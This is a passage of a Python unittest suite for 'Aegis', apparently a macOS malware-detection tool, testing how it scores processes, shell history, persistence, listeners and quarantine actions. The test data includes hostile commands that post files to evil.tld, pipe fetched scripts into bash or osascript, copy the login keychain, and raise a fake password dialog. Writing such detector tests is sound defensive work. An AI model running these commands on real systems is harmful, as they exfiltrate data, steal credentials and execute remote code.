    def test_tccutil_reset_is_high(self):
        self.assertEqual(self._sev('tccutil reset All'), "HIGH")

    def test_keychain_db_access_is_high(self):
        self.assertEqual(self._sev(
            'cp /Users/x/Library/Keychains/login.keychain-db /tmp/kc'), "HIGH")

    def test_curl_exfil_post_is_high(self):
        self.assertEqual(self._sev(
            'curl -k -X POST -F file=@/tmp/app.zip https://evil.tld/up'), "HIGH")

    def test_fileless_fetch_exec_combo_is_high(self):
        # network fetch piped into an interpreter = the fileless pipeline.
        self.assertEqual(self._sev('curl -fsSL https://evil.tld/x | bash'), "HIGH")
        self.assertEqual(self._sev('curl -s https://evil.tld/s | osascript'), "HIGH")

    def test_lone_curl_pipe_is_not_notify_grade(self):
        # A bare pipe-to-shell with NO network fetch (benign-ish) stays < HIGH.
        sev = self._sev('cat script.sh | bash')
        self.assertIsNotNone(sev)
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_antivm_probe_is_medium(self):
        self.assertEqual(self._sev('sysctl hw.optional.arm.FEAT_BTI'), "MEDIUM")

    def test_benign_argv_is_clean(self):
        self.assertIsNone(self._sev('/usr/bin/python3 /Users/x/app.py --serve'))
        self.assertIsNone(self._sev('git commit -m "curl the docs later"'))

    def test_perl_regex_alternation_not_a_pipe(self):
        # A `|` INSIDE a quoted perl/sed regex alternation is not a shell pipe —
        # `s{(rm|node|perl)}` must NOT trip pipe-to-interpreter (live-host FP fix).
        sigs = aegis._argv_signals("perl -i -pe 's{(rm|mv|node|perl|python)}{X}g' f")
        self.assertNotIn("pipe-to-interpreter", [n for n, _ in sigs], sigs)


# --------------------------------------------------------------------------- #
# N15 — check_behavior: same-user filtering + never flags Aegis itself.
# --------------------------------------------------------------------------- #
class TestCheckBehavior(Sandbox):
    def _run_with_ps(self, ps_rows):
        # Sandbox stubs check_behavior to []; restore the real one and feed it a
        # canned process table via a stubbed aegis.run.
        real_check = self._saved["check_behavior"]
        saved_run = aegis.run

        def fake_run(cmd, timeout=15):
            if cmd[:2] == ["ps", "-axo"]:
                return "\n".join(ps_rows), "", 0
            return saved_run(cmd, timeout)
        aegis.run = fake_run
        try:
            return real_check()
        finally:
            aegis.run = saved_run

    def test_same_user_hostile_process_flagged(self):
        uid = str(os.getuid())
        rows = ["  501 %s /usr/bin/osascript osascript -e display dialog "
                "\"pw\" default answer \"\" with hidden answer" % uid]
        fs = self._run_with_ps(rows)
        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")

    def test_other_user_process_ignored(self):
        # uid 0 (root) row: unprivileged Aegis can't trust its argv → skipped.
        rows = ["    1 0 /usr/bin/osascript osascript -e display dialog "
                "\"pw\" default answer \"\" with hidden answer"]
        self.assertEqual(self._run_with_ps(rows), [])

    def test_aegis_itself_not_flagged(self):
        # Self-exclusion is by the real PID (unspoofable), so our OWN scanning
        # process is skipped even when its argv carries hostile-looking patterns.
        uid = str(os.getuid())
        mypid = str(os.getpid())
        rows = ["%6s %s /usr/bin/osascript osascript -e display dialog \"pw\" "
                "default answer \"\" with hidden answer" % (mypid, uid)]
        self.assertEqual(self._run_with_ps(rows), [])

    def test_aegis_substring_in_argv_does_not_evade(self):
        # An attacker who reads this open-source check cannot dodge detection by
        # putting the literal word "aegis" in their command line (the old substring
        # self-exclusion let a phish dialog reading "System aegis needs…" through).
        uid = str(os.getuid())
        rows = ["  888 %s /usr/bin/osascript osascript -e display dialog "
                "\"System aegis needs your password\" default answer \"\" "
                "with hidden answer" % uid]
        fs = self._run_with_ps(rows)
        self.assertTrue(any(f["category"] == "behavior" for f in fs), fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")


# --------------------------------------------------------------------------- #
# N16 — shell HISTORY: ClickFix terminal-paste residue.
# --------------------------------------------------------------------------- #
class TestShellHistory(Sandbox):
    def _hist(self, *lines):
        p = os.path.join(self.tmp, ".zsh_history")
        with open(p, "w") as f:
            f.write("\n".join(lines) + "\n")
        aegis.SHELL_HISTORY_FILES = [p]
        return aegis.check_shell_history()

    def test_clickfix_chain_flagged_high(self):
        fs = self._hist("ls -la",
                        "dscl . -authonly $(whoami) $PW && curl -o /tmp/update https://evil.tld/x")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "shell-history")

    def test_zsh_extended_history_prefix_stripped(self):
        fs = self._hist(": 1700000000:0;curl -fsSL https://evil.tld/x | bash")
        self.assertTrue(fs)

    def test_clean_history_no_findings(self):
        self.assertEqual(self._hist("cd ~/src", "git status", "make test"), [])

    def test_lone_benign_fetch_is_not_notify_grade(self):
        # A lone `curl https://…` (no pipe-to-shell) is everyday dev work — it must
        # score MEDIUM (logged, below the HIGH notify floor), NOT fire a HIGH
        # desktop alert. Same gating the live-process behavioral tier uses.
        fs = self._hist("curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "MEDIUM")
        self.assertLess(aegis.SEV_ORDER[fs[0]["severity"]],
                        aegis.SEV_ORDER[aegis.NOTIFY_MIN_SEV])

    def test_first_run_adopts_history_silently_then_new_alerts(self):
        # Shell-history residue (a months-old `curl|sh` install line) is adopted
        # silently on the FIRST scan — logged, not notified — so upgrading Aegis on
        # a busy machine is not a storm; a NEW hostile line thereafter alerts.
        f1 = aegis.finding("HIGH", "shell-history",
                           "Hostile command in shell history", "old install",
                           "shellhist:.zsh_history:aaaa1111")
        self.assertEqual(aegis.emit([f1], first_run=True), [],
                         "existing history must be silent on first run")
        f2 = aegis.finding("HIGH", "shell-history",
                           "Hostile command in shell history", "new phish",
                           "shellhist:.zsh_history:bbbb2222")
        self.assertEqual(len(aegis.emit([f2], first_run=False)), 1,
                         "a new hostile line must alert after first run")

    def test_first_run_does_not_suppress_live_behavior(self):
        # Contrast: a RUNNING hostile process (behavior) is a live threat and must
        # alert even on the very first scan — suppression is residue-only.
        fb = aegis.finding("CRITICAL", "behavior", "Suspicious process behavior",
                           "osascript phish", "behavior:osascript:cccc3333")
        self.assertEqual(len(aegis.emit([fb], first_run=True)), 1)

    def test_upgrade_adopts_history_silently_then_new_line_alerts(self):
        # README guarantee: upgrading Aegis on an existing install is storm-free
        # per-surface. shell-history is a LIVE surface, so an install predating it
        # (a baseline with no `shell_history_adopted` marker) must adopt existing
        # residue SILENTLY on the first scan that supports it — NOT alert a
        # months-old `curl|sh` line — then alert genuinely-new hostile lines.
        hist = os.path.join(self.tmp, ".zsh_history")
        with open(hist, "w") as f:
            f.write("curl -fsSL https://evil.tld/old | bash\n")  # pre-existing residue
        aegis.SHELL_HISTORY_FILES = [hist]
        # A pre-existing (pre-feature) baseline: valid, but with no adoption marker.
        aegis.save_json(aegis.BASELINE, {"created": "2020-01-01T00:00:00+00:00",
                                         "persistence": {}})
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [],
                         "upgrade must adopt existing history residue silently")
        base = aegis.load_json(aegis.BASELINE, {})
        self.assertTrue(base.get("shell_history_adopted"),
                        "adoption marker must be recorded so it happens once")
        # A NEW hostile line after adoption must alert.
        with open(hist, "a") as f:
            f.write("curl -fsSL https://evil.tld/new | bash\n")
        aegis.cmd_scan(quiet=True)
        self.assertTrue(self.notifications,
                        "a new hostile history line must alert after adoption")


# --------------------------------------------------------------------------- #
# N17 — /tmp loot-staging IOC filenames.
# --------------------------------------------------------------------------- #
class TestStaging(Sandbox):
    def _stage(self, name, age_days=0):
        d = os.path.join(self.tmp, "stg")
        os.makedirs(d, exist_ok=True)
        p = os.path.join(d, name)
        with open(p, "w") as f:
            f.write("loot")
        if age_days:
            old = time.time() - age_days * 86400
            os.utime(p, (old, old))
        aegis.STAGING_DIRS = [d]
        return aegis.check_staging()

    def test_ioc_archive_flagged(self):
        fs = self._stage("app.zip")
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "staging")

    def test_staged_keychain_flagged(self):
        self.assertTrue(self._stage("login.keychain-db"))

    def test_non_ioc_ignored(self):
        self.assertEqual(self._stage("myproject.zip"), [])

    def test_old_ioc_ignored(self):
        self.assertEqual(self._stage("app.zip", age_days=30), [])


# --------------------------------------------------------------------------- #
# N18 — XProtect Remediator harvest: a detection event → CRITICAL; clean → none.
# --------------------------------------------------------------------------- #
class TestXProtectHarvest(Sandbox):
    def _harvest(self, ndjson_lines):
        aegis.XPROTECT_BUNDLES = []  # skip freshness; test detection parsing only
        real = self._saved["check_xprotect"]

        def fake_run(cmd, timeout=45):
            if cmd[:2] == ["log", "show"]:
                return "\n".join(ndjson_lines), "", 0
            return "", "", 0
        saved_run = aegis.run
        aegis.run = fake_run
        try:
            return real()
        finally:
            aegis.run = saved_run

    def _event(self, module, status, caused=None):
        msg = json.dumps({"status_message": status, "caused_by": caused or []})
        return json.dumps({
            "processImagePath":
                "/Library/Apple/System/Library/CoreServices/XProtect.app/"
                "Contents/MacOS/XProtectRemediator%s" % module,
            "eventMessage": msg, "timestamp": "2026-07-13 18:42:58"})

    def test_detection_is_critical(self):
        fs = self._harvest([self._event("KeySteal", "ThreatRemediated",
                                        ["/tmp/evil"])])
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")
        self.assertEqual(fs[0]["category"], "xprotect")

    def test_clean_scan_no_finding(self):
        self.assertEqual(
            self._harvest([self._event("RankStank", "NoThreatDetected")]), [])


# --------------------------------------------------------------------------- #
# N19 — wallet integrity surface: a config/binary change alerts HIGH.
# --------------------------------------------------------------------------- #
class TestWalletIntegrity(Sandbox):
    def test_wallet_config_change_is_high(self):
        p = os.path.join(self.tmp, "app.json")
        with open(p, "w") as f:
            f.write('{"endpoints":"legit"}')
        aegis.WALLET_CONFIG_FILES = [p]
        aegis.WALLET_APP_BINS = []
        prior = aegis.snapshot_wallet()
        with open(p, "w") as f:
            f.write('{"endpoints":"attacker"}')
        fs = aegis.diff_wallet(prior, aegis.snapshot_wallet())
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["category"], "wallet-integrity")


# --------------------------------------------------------------------------- #
# N20 — known-vendor label impersonation (ClickFix Keystone): a com.google.*
# label whose program isn't Google-signed is HIGH/CRITICAL; a genuine one isn't.
# --------------------------------------------------------------------------- #
class TestVendorImpersonation(Sandbox):
    def _sev(self, label, authority, prog="/Users/x/.hidden/GoogleUpdate"):
        rec = {"label": label, "program": prog, "args": [prog],
               "trust": "developer-id", "sha256": "s", "run_at_load": True,
               "env": None, "authority": authority}
        return aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]

    def test_fake_keystone_is_high_or_critical(self):
        sev = self._sev("com.google.keystone.agent",
                        "Developer ID Application: Totally Not Google (ABCDE12345)")
        self.assertGreaterEqual(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_genuine_google_not_impersonation(self):
        # Correct Google Team ID in the authority → not flagged as impersonation.
        # (A trusted-path, dev-id-signed Google agent should not score HIGH here.)
        sev = self._sev("com.google.keystone.agent",
                        "Developer ID Application: Google LLC (EQHXZ8M8AV)",
                        prog="/Library/Google/GoogleSoftwareUpdate/agent")
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)

    def test_real_keystone_unresolvable_program_not_high(self):
        # Live-host FP fix: the REAL Google Keystone plist often points at a path
        # absent at scan time (trust 'unknown', no authority) — an unresolvable
        # program is a weak 'missing' signal, NOT impersonation, so it must not be
        # HIGH (would false-positive on legitimate Google software every scan).
        rec = {"label": "com.google.keystone.agent", "program": None,
               "args": None, "trust": "unknown", "sha256": None,
               "run_at_load": True, "env": None, "authority": None}
        sev = aegis.check_persistence({}, {"/fake/x.plist": rec})[0]["severity"]
        self.assertLess(aegis.SEV_ORDER[sev], aegis.SEV_ORDER["HIGH"], sev)


# --------------------------------------------------------------------------- #
# N21 — canary / honeypot tripwire: modified or deleted canary → CRITICAL.
# --------------------------------------------------------------------------- #
class TestCanaries(Sandbox):
    def _plant(self, content="canary"):
        p = os.path.join(self.tmp, "canary.txt")
        with open(p, "w") as f:
            f.write(content)
        aegis.save_json(aegis.CANARY_STATE, {p: aegis.sha256(p)})
        return p

    def test_intact_canary_no_finding(self):
        self._plant()
        self.assertEqual(aegis.check_canaries(), [])

    def test_modified_canary_is_critical(self):
        p = self._plant()
        with open(p, "w") as f:
            f.write("ENCRYPTED_BY_RANSOMWARE")
        fs = aegis.check_canaries()
        self.assertTrue(fs)
        self.assertEqual(fs[0]["severity"], "CRITICAL")

    def test_deleted_canary_is_critical(self):
        p = self._plant()
        os.remove(p)
        fs = aegis.check_canaries()
        self.assertTrue(fs and fs[0]["severity"] == "CRITICAL")


# --------------------------------------------------------------------------- #
# N22 — trust-store tamper: baseline.json edited out-of-band → self-protection HIGH.
# --------------------------------------------------------------------------- #
class TestTrustStoreTamper(Sandbox):
    def test_out_of_band_baseline_edit_flagged(self):
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()  # records the baseline hash as known-good
        # Attacker edits the baseline directly (poisons ground truth).
        aegis.save_json(aegis.BASELINE, {"persistence": {"/evil.plist": {}}})
        fs = aegis.check_self_protection()
        self.assertTrue(any("tampered" in f["fingerprint"] for f in fs), fs)

    def test_no_false_positive_when_unchanged(self):
        aegis.save_json(aegis.BASELINE, {"persistence": {}})
        aegis.record_selfstate()
        fs = aegis.check_self_protection()
        self.assertFalse(any("tampered" in f["fingerprint"] for f in fs), fs)


class TestResponseTier(Sandbox):
    """The opt-in quarantine/restore/destroy/kill/sandbox/neutralize response
    tier. Every path is redirected into the per-test tmp store; no real ~/.aegis
    quarantine dir is touched and nothing on the host is killed (the kill guards
    fire before any signal is sent)."""

    def setUp(self):
        super().setUp()
        extra = {
            "QUARANTINE_DIR": os.path.join(self.state, "quarantine"),
            "QUARANTINE_MANIFEST": os.path.join(self.state, "quarantine",
                                                "manifest.json"),
            "ACTION_LOG": os.path.join(self.state, "actions.jsonl"),
        }
        for k, v in extra.items():
            self._saved[k] = getattr(aegis, k)
            setattr(aegis, k, v)

    def _victim(self, data=b"\x00MALWARE\xffpayload\x10bytes", mode=0o755):
        p = os.path.join(self.tmp, "evil.bin")
        with open(p, "wb") as f:
            f.write(data)
        os.chmod(p, mode)
        return p, aegis.sha256(p), data

    def _only_qid(self):
        man = aegis.load_json(aegis.QUARANTINE_MANIFEST, {})
        self.assertEqual(len(man), 1, man)
        return next(iter(man))

    # quarantine ----------------------------------------------------------
    def test_quarantine_removes_original(self):
        p, _sha, _d = self._victim()
        self.assertEqual(aegis.cmd_quarantine(p), 0)
        self.assertFalse(os.path.exists(p), "original not removed after quarantine")

    def test_quarantine_neutralizes_stored_bytes(self):
        p, _sha, data = self._victim()
        aegis.cmd_quarantine(p)
        qid = self._only_qid()
        payload = os.path.join(aegis.QUARANTINE_DIR, qid, "payload.quar")
        os.chmod(payload, 0o600)
        stored = open(payload, "rb").read()
        # The store copy must NOT be the raw malware bytes (neutered-sample rule:
        # can't be accidentally executed, won't be re-flagged by another scanner).
        self.assertNotEqual(stored, data, "quarantined payload is NOT neutralized")

    def test_quarantine_payload_not_world_readable(self):
        p, _sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        payload = os.path.join(aegis.QUARANTINE_DIR, self._only_qid(), "payload.quar")
        self.assertEqual(os.stat(payload).st_mode & 0o777, 0, "payload not chmod 000")

    # restore -------------------------------------------------------------
    def test_restore_is_byte_identical(self):
        p, sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        qid = self._only_qid()
        self.assertEqual(aegis.cmd_restore(qid), 0)
        self.assertTrue(os.path.exists(p))
        self.assertEqual(aegis.sha256(p), sha, "restore not byte-identical")
        self.assertEqual(aegis.load_json(aegis.QUARANTINE_MANIFEST, {}), {},
                         "manifest not cleared after restore")

    def test_restore_replays_mode(self):
        p, _sha, _d = self._victim(mode=0o700)
        aegis.cmd_quarantine(p)
        aegis.cmd_restore(self._only_qid())
        self.assertEqual(os.stat(p).st_mode & 0o777, 0o700)

    def test_restore_to_collision_path(self):
        p, sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        qid = self._only_qid()
        with open(p, "wb") as f:  # something else now occupies the original path
            f.write(b"a different file took the slot")
        aegis.cmd_restore(qid)
        self.assertTrue(os.path.exists(p + ".restored"),
                        "collision restore did not fall back to .restored")
        self.assertEqual(aegis.sha256(p + ".restored"), sha)

    # destroy (the only irreversible verb) --------------------------------
    def test_destroy_refuses_without_confirmation(self):
        p, _sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        qid = self._only_qid()
        self.assertNotEqual(aegis.cmd_destroy(qid, confirmed=False), 0)
        self.assertIn(qid, aegis.load_json(aegis.QUARANTINE_MANIFEST, {}),
                      "refused destroy still removed the item")

    def test_destroy_removes_from_store(self):
        p, _sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        qid = self._only_qid()
        self.assertEqual(aegis.cmd_destroy(qid, confirmed=True), 0)
        self.assertFalse(os.path.exists(os.path.join(aegis.QUARANTINE_DIR, qid)))
        self.assertEqual(aegis.load_json(aegis.QUARANTINE_MANIFEST, {}), {})

    def test_destroy_unknown_id_fails(self):
        # There is NO 'delete a live path' command — destroy only knows store ids.
        self.assertNotEqual(aegis.cmd_destroy("does-not-exist", confirmed=True), 0)

    # safety rails --------------------------------------------------------
    def test_refuse_directory(self):
        d = os.path.join(self.tmp, "adir")
        os.makedirs(d)
        self.assertNotEqual(aegis.cmd_quarantine(d), 0)
        self.assertTrue(os.path.isdir(d), "directory was touched")

    def test_refuse_protected_system_path(self):
        self.assertTrue(aegis._is_protected_path("/System/Library/CoreServices/x"))
        self.assertTrue(aegis._is_protected_path("/usr/bin/python3"))
        self.assertTrue(aegis._is_protected_path("/"))

    def test_refuse_self_and_state(self):
        self.assertTrue(aegis._is_protected_path(aegis._SELF_PATH))
        self.assertTrue(aegis._is_protected_path(
            os.path.join(aegis.STATE_DIR, "baseline.json")))

    def test_refuse_home_and_ancestors(self):
        self.assertTrue(aegis._is_protected_path(aegis.HOME))
        self.assertTrue(aegis._is_protected_path("/Users"))

    def test_missing_file_refused(self):
        self.assertNotEqual(
            aegis.cmd_quarantine(os.path.join(self.tmp, "nope.bin")), 0)

    def test_action_log_records_quarantine(self):
        p, _sha, _d = self._victim()
        aegis.cmd_quarantine(p)
        self.assertTrue(os.path.exists(aegis.ACTION_LOG))
        recs = [json.loads(l) for l in open(aegis.ACTION_LOG) if l.strip()]
        self.assertTrue(any(r["action"] == "quarantine" and r["result"] == "ok"
                            for r in recs), recs)

    # kill (guards fire before any signal is sent) ------------------------
    def test_kill_refuses_self(self):
        self.assertNotEqual(aegis.cmd_kill(os.getpid()), 0)

    def test_kill_refuses_init(self):
        self.assertNotEqual(aegis.cmd_kill(1), 0)

    def test_kill_nonexistent_pid(self):
        self.assertNotEqual(aegis.cmd_kill(999999), 0)

    def test_kill_refuses_other_user_process(self):
        # Find a live process owned by another uid (e.g. a root daemon) and prove
        # the guard refuses it WITHOUT killing it. Skip if none is visible.
        out = subprocess.run(["ps", "-axo", "pid=,uid="], capture_output=True,
                             text=True).stdout
        target = None
        for line in out.splitlines():
            parts = line.split()
            if len(parts) == 2 and parts[1] != str(os.getuid()) \
                    and parts[0] not in ("0", "1"):
                target = int(parts[0])
                break
        if target is None:
            self.skipTest("no other-user process visible")
        self.assertNotEqual(aegis.cmd_kill(target), 0)
        self.assertEqual(subprocess.run(["ps", "-p", str(target)]).returncode, 0,
                         "guard should not have killed the other-user process")

    # neutralize (ordered launchd kill-chain) -----------------------------
    def test_neutralize_quarantines_plist(self):
        plist = self.write_plist("com.evil.agent.plist",
                                 ["/bin/echo", "persist"], run_at_load=True)
        rc = aegis.cmd_neutralize(plist)
        self.assertEqual(rc, 0)
        self.assertFalse(os.path.exists(plist), "plist not quarantined/removed")
        man = aegis.load_json(aegis.QUARANTINE_MANIFEST, {})
        self.assertTrue(any(m.get("orig_path") == os.path.realpath(plist)
                            for m in man.values()), man)

    # sandbox (real deny-default Seatbelt jail) ---------------------------
    def test_sandbox_runs_and_refuses_nonfile(self):
        self.assertNotEqual(
            aegis.cmd_sandbox(os.path.join(self.tmp, "nope")), 0)
        if os.path.exists("/usr/bin/sandbox-exec") and os.path.exists("/bin/echo"):
            # A benign binary runs to completion inside the jail (returns 0).
            self.assertEqual(aegis.cmd_sandbox("/bin/echo", ["ok"]), 0)


# --------------------------------------------------------------------------- #
# Network-listener surface — non-loopback TCP LISTEN diffing (bind-shell shape).
# Loopback dev servers and SIP-pinned Apple daemons must NOT alert; a new
# unsigned/ad-hoc listener from a user-writable path must be HIGH.
# --------------------------------------------------------------------------- #
class TestListenerSurface(Sandbox):
    def test_parse_skips_loopback_keeps_wildcard_and_v6(self):
        text = ("p633\nczotero\nLuser\nf30\nn127.0.0.1:23119\n"
                "p636\ncCC\nf8\nn*:7000\nf9\nn[::1]:8080\nf10\nn[fe80::1]:9999\n")
        got = aegis._parse_lsof_listeners(text)
        self.assertNotIn("633", got, "loopback-only pid must be dropped")
        self.assertEqual(got["636"], {"*:7000", "[fe80::1]:9999"})

    def test_platform_daemon_skipped_interpreter_and_thirdparty_kept(self):
        self.assertFalse(aegis._listener_worth_tracking("/usr/libexec/rapportd"))
        self.assertFalse(aegis._listener_worth_tracking("/System/Library/CoreServices/x"))
        # An Apple-signed interpreter serving the network IS a payload shape.
        self.assertTrue(aegis._listener_worth_tracking("/usr/bin/python3"))
        self.assertTrue(aegis._listener_worth_tracking("/usr/bin/nc"))
        # Third-party and unresolvable paths are always tracked.
        self.assertTrue(aegis._listener_worth_tracking("/opt/homebrew/bin/nginx"))
        self.assertTrue(aegis._listener_worth_tracking(None))

    def test_new_suspicious_listener_is_high(self):
        evil = self.adhoc_binary(os.path.join(self.hot, "srv"))
        fs = aegis.diff_listeners({}, {"%s:4444" % evil: evil})
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertEqual(fs[0]["port"], "4444")

    def test_new_signed_listener_is_medium_not_notify(self):
        fs = aegis.diff_listeners({}, {"/bin/ls:8000": "/bin/ls"})
        self.assertEqual(len(fs), 1)
        self.assertEqual(fs[0]["severity"], "MEDIUM",
                         "a signed listener must stay below the notify floor")

    def test_preexisting_listener_not_realerted(self):
        cur = {"/bin/ls:8000": "/bin/ls"}
        self.assertEqual(aegis.diff_listeners(dict(cur), cur), [])

    def test_listener_surface_participates_in_scan_quietly(self):
        # Pin that the registry entry is live: a scan baselines the surface
        # (adopted per-surface) and an unchanged re-scan stays silent.
        aegis.cmd_scan(quiet=True)  # first run: baseline (LSOF stub ⇒ empty)
        self.notifications.clear()
        aegis.cmd_scan(quiet=True)
        self.assertEqual(self.notifications, [])
        base = json.load(open(aegis.BASELINE))
        self.assertIn("listeners", base)


# --------------------------------------------------------------------------- #
# Hot-dir .app bundles — the DMG/ZIP drag-out delivery vector is a DIRECTORY,
# invisible to the file-oriented Mach-O check. Ad-hoc bundle ⇒ HIGH; signed-but-
# unnotarized ⇒ MEDIUM with Gatekeeper's own verdict; notarized ⇒ silent.
# --------------------------------------------------------------------------- #
class TestHotDirAppBundle(Sandbox):
    def _mk_app(self, name="Evil.app"):
        app = os.path.join(self.hot, name)
        macos = os.path.join(app, "Contents", "MacOS")
        os.makedirs(macos)
        exe = self.adhoc_binary(os.path.join(macos, name[:-4]))
        with open(os.path.join(app, "Contents", "Info.plist"), "wb") as f:
            plistlib.dump({"CFBundleExecutable": name[:-4]}, f)
        return app, exe

    def test_adhoc_app_bundle_is_high(self):
        app, _exe = self._mk_app()
        fs = [f for f in aegis.check_hot_dirs()
              if f["category"] == "hot-dir" and f.get("path") == app]
        self.assertEqual(len(fs), 1, fs)
        self.assertEqual(fs[0]["severity"], "HIGH")
        self.assertTrue(fs[0]["fingerprint"].startswith("hotdir:app:"))

    def test_unnotarized_devid_app_is_medium_with_verdict(self):
        app, _exe = self._mk_app("Tool.app")
        saved_cs, saved_gk = aegis.classify_signature, aegis.gatekeeper_verdict
        aegis.classify_signature = lambda p: {
            "trust": "developer-id", "team": "T",
            "authority": "Developer ID Application: X (T)"}
        aegis.gatekeeper_verdict = lambda p: ("rejected", None)
        try:
            fs = [f for f in aegis.check_hot_dirs() if f.get("path") == app]
        finally:
            aegis.classify_signature = saved_cs
            aegis.gatekeeper_verdict = saved_gk
        self.assertEqual(len(fs), 1, fs)
        self.assertEqual(fs[0]["severity"], "MEDIUM")
        self.assertEqual(fs[0]["gatekeeper"], "rejected")
        self.assertTrue(fs[0]["fingerprint"].startswith("hotdir:notary:"))

    def test_notarized_app_is_silent(self):
        app, _exe = self._mk_app("Fine.app")
        saved_cs, saved_gk = aegis.classify_signature, aegis.gatekeeper_verdict
        aegis.classify_signature = lambda p: {
            "trust": "developer-id", "team": "T", "authority": "x"}
        aegis.gatekeeper_verdict = lambda p: ("accepted", "Notarized Developer ID")
        try:
            fs = [f for f in aegis.check_hot_dirs() if f.get("path") == app]
        finally:
            aegis.classify_signature = saved_cs
            aegis.gatekeeper_verdict = saved_gk
        self.assertEqual(fs, [], "a notarized fresh app must not alert")

    def test_malformed_bundle_no_finding_no_raise(self):
        app = os.path.join(self.hot, "Broken.app")
        os.makedirs(os.path.join(app, "Contents"))
        self.assertEqual([f for f in aegis.check_hot_dirs()
                          if f.get("path") == app], [])

    def test_gatekeeper_verdict_rejects_adhoc(self):
        b = self.adhoc_binary(os.path.join(self.tmp, "gk_t"))
        verdict, _src = aegis.gatekeeper_verdict(b)
        self.assertEqual(verdict, "rejected")

    def test_bundle_executable_rejects_path_separator(self):
        # CFBundleExecutable is attacker-authored plist data: '/bin/sh' (or a
        # ../ escape) would point classification at a clean out-of-bundle Apple
        # binary instead of the payload. Anything but a bare filename ⇒ None.
        app, _exe = self._mk_app("Escape.app")
        for evil in ("/bin/sh", "../../../../bin/sh"):
            with open(os.path.join(app, "Contents", "Info.plist"), "wb") as f:
                plistlib.dump({"CFBundleExecutable": evil}, f)
            self.assertIsNone(aegis._bundle_executable(app), evil)

    def test_payload_swap_into_old_bundle_still_flagged(self):
        # Swapping a payload into an old bundle's Contents/MacOS never touches
        # the .app ROOT mtime — freshness must be max(root, exe) so root-only
        # aging is not a staleness evasion.
        app, _exe = self._mk_app("Stale.app")
        old = time.time() - 90 * 86400
        os.utime(app, (old, old))
        fs = [f for f in aegis.check_hot_dirs()
              if f["category"] == "hot-dir" and f.get("path") == app]
        self.assertEqual(len(fs), 1, "fresh exe in old bundle must still alert")
        self.assertEqual(fs[0]["severity"], "HIGH")

    def test_genuinely_old_bundle_is_skipped(self):
        app, exe = self._mk_app("Ancient.app")
        old = time.time() - 90 * 86400
        os.utime(exe, (old, old))
        os.utime(app, (old, old))
        self.assertEqual([f for f in aegis.check_hot_dirs()
                          if f.get("path") == app], [])


# --------------------------------------------------------------------------- #
# Event-driven watch — the kqueue plumbing must actually wake on a change to a
# watched dir (and not wake without one). Uses the sandboxed dirs only.
# --------------------------------------------------------------------------- #
class TestWatchKqueue(Sandbox):
    def test_watch_paths_cover_sandbox_dirs(self):
        ps = aegis._watch_paths()
        self.assertIn(self.pers, ps)
        self.assertIn(self.hot, ps)

    def test_event_wakes_watch_within_seconds(self):
        import threading
        kq, fds = aegis._build_watch()
        try:
            t = threading.Timer(
                0.3, lambda: open(os.path.join(self.hot, "drop"), "w").close())
            t.start()
            t0 = time.time()
            fired = aegis._wait_for_change(kq, 10)
            elapsed = time.time() - t0
            t.join()
            self.assertTrue(fired, "file creation in a watched dir must wake")
            self.assertLess(elapsed, 5, "wake must be event-speed, not timeout")
        finally:
            aegis._close_watch(kq, fds)

    def test_no_event_times_out_false(self):
        kq, fds = aegis._build_watch()
        try:
            self.assertFalse(aegis._wait_for_change(kq, 0.3))
        finally:
            aegis._close_watch(kq, fds)


# --------------------------------------------------------------------------- #
# Live XProtect log-stream tail — the tail is a WAKE SOURCE for the watch loop
# (data on its stdout must wake the kqueue like a file change; the fd must be
# drainable so the level-triggered filter cannot busy-spin).
# --------------------------------------------------------------------------- #
class TestLiveStreamTail(Sandbox):
    def test_drain_fd_reads_all_and_reports(self):
        r, w = os.pipe()
        try:
            os.set_blocking(r, False)
            # Writer must be non-blocking too: pipe capacity is ~64KB and
            # nothing reads until _drain_fd below, so a blocking oversized
            # write would deadlock this test. Fill the pipe to capacity.
            os.set_blocking(w, False)
            self.assertFalse(aegis._drain_fd(r), "empty fd must report False")
            written = 0
            try:
                while written < 200000:
                    written += os.write(w, b"x" * 65536)
            except BlockingIOError:
                pass  # pipe full — as much buffered as the OS allows
            self.assertGreater(written, 0)
            self.assertTrue(aegis._drain_fd(r))
            self.assertFalse(aegis._drain_fd(r), "drain must consume everything")
        finally:
            os.close(r)
            os.close(w)

    def test_data_on_extra_fd_wakes_watch(self):
        import threading
        r, w = os.pipe()
        os.set_blocking(r, False)
        kq, fds = aegis._build_watch(extra_read_fds=(r,))
        try:
            t = threading.Timer(0.3, lambda: os.write(w, b'{"event":1}\n'))
            t.start()
            t0 = time.time()
            fired = aegis._wait_for_change(kq, 10)
            t.join()
            self.assertTrue(fired, "stream data must wake the watch loop")
            self.assertLess(time.time() - t0, 5)
        finally:
            aegis._close_watch(kq, fds)
            os.close(r)
            os.close(w)

    def test_spawn_and_stop_real_log_stream(self):
        p = aegis._spawn_xprotect_stream()
        self.assertIsNotNone(p, "log stream should spawn on macOS")
        try:
            self.assertIsNone(p.poll(), "tail must stay running")
        finally:
            aegis._stop_stream(p)
        self.assertIsNotNone(p.poll(), "tail must be terminated after stop")


if __name__ == "__main__":
    unittest.main(verbosity=2)
